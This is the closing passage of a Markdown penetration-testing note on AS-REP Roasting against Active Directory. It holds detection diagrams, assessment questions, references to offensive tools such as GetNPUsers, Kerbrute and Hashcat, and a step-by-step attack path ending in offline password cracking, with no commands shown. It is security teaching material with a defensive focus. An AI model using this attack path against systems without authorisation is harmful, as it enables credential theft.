      +--> Detect
             |
             +--> Monitor vulnerable accounts
             +--> Event 4768
             +--> Directory change monitoring
             +--> Kerberos request patterns
```

The assessment should answer:

```text
Which accounts do not require
Kerberos pre-authentication?
          |
          v
Are those accounts enabled?
          |
          v
Can an unauthenticated requester
obtain an AS-REP?
          |
          v
Which encryption type is used?
          |
          v
Is the password realistically recoverable?
          |
          v
What privileges does the account possess?
          |
          v
Can defenders identify the activity?
          |
          v
Can pre-authentication be restored?
```

---

# Related Notes

Active Directory methodology:

[Active Directory Penetration Testing Methodology](methodology.md)

Active Directory enumeration:

[Active Directory Enumeration](enumeration.md)

Kerberos:

[Kerberos](kerberos.md)

NTLM:

[NTLM](ntlm.md)

Password spraying:

[Password Spraying](password-spraying.md)

Impacket:

[Impacket](impacket.md)

NetExec:

[NetExec](netexec.md)

BloodHound:

[BloodHound](bloodhound.md)

The following topics complement AS-REP Roasting and can be linked once their dedicated notes are available:

```text
active-directory/kerberoasting.md
active-directory/pass-the-hash.md
active-directory/overpass-the-hash.md
active-directory/pass-the-key.md
active-directory/lateral-movement.md
```

---

# References

## Microsoft Kerberos

[Microsoft - Kerberos authentication overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview){ target="_blank" rel="noopener noreferrer" }

[Microsoft - Kerberos technical overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview){ target="_blank" rel="noopener noreferrer" }

[Microsoft - UserAccountControl flags](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties){ target="_blank" rel="noopener noreferrer" }

---

## MITRE ATT&CK

[MITRE ATT&CK - Steal or Forge Kerberos Tickets: AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/){ target="_blank" rel="noopener noreferrer" }

---

## Impacket

[Fortra Impacket](https://github.com/fortra/impacket){ target="_blank" rel="noopener noreferrer" }

[Impacket GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py){ target="_blank" rel="noopener noreferrer" }

---

## Kerbrute

[Kerbrute](https://github.com/ropnop/kerbrute){ target="_blank" rel="noopener noreferrer" }

---

## BloodHound

[BloodHound Documentation](https://bloodhound.specterops.io/){ target="_blank" rel="noopener noreferrer" }

---

## Hashcat

[Hashcat](https://hashcat.net/hashcat/){ target="_blank" rel="noopener noreferrer" }

[Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes){ target="_blank" rel="noopener noreferrer" }

---

## John the Ripper

[Openwall - John the Ripper](https://www.openwall.com/john/){ target="_blank" rel="noopener noreferrer" }

---

# Final Notes

AS-REP Roasting is fundamentally a Kerberos configuration and password-strength issue.

The critical distinctions are:

```text
AS-REP Roasting != Kerberoasting

AS-REP != NT hash

AS-REP != NetNTLMv2

AS-REP obtained != Password recovered

Password recovered != Administrator
```

The attack path is:

```text
Known username
      |
      v
Kerberos pre-authentication disabled
      |
      v
Unauthenticated AS-REQ
      |
      v
AS-REP returned
      |
      v
Password-derived encrypted material
      |
      v
Offline password cracking
      |
      v
Credential recovery
      |
      v
Privilege analysis
      |
      v
Minimum impact validation
```

The most effective defensive control is to remove the condition that enables the technique:

```text
Require Kerberos pre-authentication
```

combined with:

```text
Strong passwords
      +
Least privilege
      +
Configuration monitoring
      +
Kerberos authentication monitoring
```

A mature assessment should therefore identify not only whether AS-REP material can be obtained, but why the affected account has pre-authentication disabled, whether its password is realistically recoverable, what privileges it possesses, whether defenders can detect the activity, and how the legacy configuration can be removed safely.
